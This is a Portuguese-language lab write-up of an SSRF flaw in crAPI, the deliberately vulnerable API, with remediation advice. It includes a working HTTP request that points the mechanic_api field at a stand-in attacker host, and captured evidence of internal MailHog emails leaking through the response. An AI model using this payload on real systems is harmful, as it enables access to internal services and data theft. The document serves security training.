🇧🇷 Português · [🇺🇸 English](../en/vulnerabilities/05-ssrf.md)

# SSRF — Forçar o servidor a requisitar um destino arbitrário

**Categoria OWASP API Security Top 10 (2023):** `API7 — Server-Side Request Forgery`
**Severidade estimada:** `Crítica`
**Desafio crAPI correspondente:** Challenge 11 — "make crAPI send an HTTP request to an external site and return the response"

---

## 1. Resumo

O recurso de "contatar o mecânico" aceita, no corpo da requisição, uma **URL para onde o servidor fará uma chamada** (`mechanic_api` / `merchant_api`). Como esse valor não é validado contra uma allow-list, o atacante faz o **servidor** disparar requisições para qualquer destino — serviços internos, metadados de nuvem ou um host controlado pelo atacante.

## 2. Pré-condições

- Conta autenticada com token válido.
- Um destino para observar a chamada: um endpoint próprio (ex.: webhook/`http://attacker.example`) ou um serviço interno do ambiente.

## 3. Passo a passo da exploração

1. Envie uma solicitação de contato ao mecânico substituindo a URL de callback por uma controlada pelo atacante:

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: localhost:8888
Authorization: Bearer <token>
Content-Type: application/json

{
  "mechanic_api": "http://attacker.example/coleta",
  "mechanic_code": "TRAC_JHN",
  "problem_details": "teste",
  "vin": "...",
  "number_of_repeats": 1
}
```

2. Observe que **o servidor** — e não o cliente — faz a requisição ao destino informado. Apontar para um serviço interno (ex.: `http://localhost:<porta_interna>/` ou um endpoint de administração não exposto) demonstra o acesso a partir de dentro da rede.

3. Se a resposta do destino for refletida de volta na resposta da API, confirma-se também o vazamento do conteúdo acessado.

> O campo correto é **`mechanic_api`** (corpo vazio retorna `{"mechanic_api":["This field is required."]}`). Os demais campos obrigatórios são `mechanic_code`, `problem_details`, `vin` e `number_of_repeats`.

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/05-ssrf/captura.txt`](../../evidencias/05-ssrf/captura.txt).

Apontando `mechanic_api` para o **MailHog interno** (`http://mailhog:8025/api/v2/messages`), um serviço que o atacante não alcança de fora:

```
POST /workshop/api/merchant/contact_mechanic
{ "mechanic_api": "http://mailhog:8025/api/v2/messages", "mechanic_code": "TRAC_JHN", ... }

HTTP 200
{ "response_from_mechanic_api": { "total": 2, "items": [ { ...e-mails internos capturados... } ] } }
```

O servidor buscou o serviço interno e **refletiu todo o conteúdo** (os e-mails do MailHog) na resposta — SSRF com vazamento de dados internos.

## 5. Por que é um risco

SSRF transforma o servidor em um **procurador do atacante dentro da rede interna**. Em ambientes de nuvem é especialmente grave: permite ler endpoints de metadados (ex.: credenciais temporárias de instância), alcançar serviços internos sem autenticação e varrer a rede a partir de um ponto confiável. É frequentemente o primeiro passo de um comprometimento mais amplo.

## 6. Como corrigir

- **Allow-list** de domínios/destinos permitidos; rejeitar qualquer URL fora dela.
- Bloquear destinos internos/privados (loopback, faixas RFC 1918, endpoint de metadados de nuvem).
- Resolver e validar o IP de destino **após** a resolução DNS (prevenir rebinding) e desabilitar redirecionamentos.
- Isolar em nível de rede o componente que faz chamadas externas.

## 7. Referências

- [API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
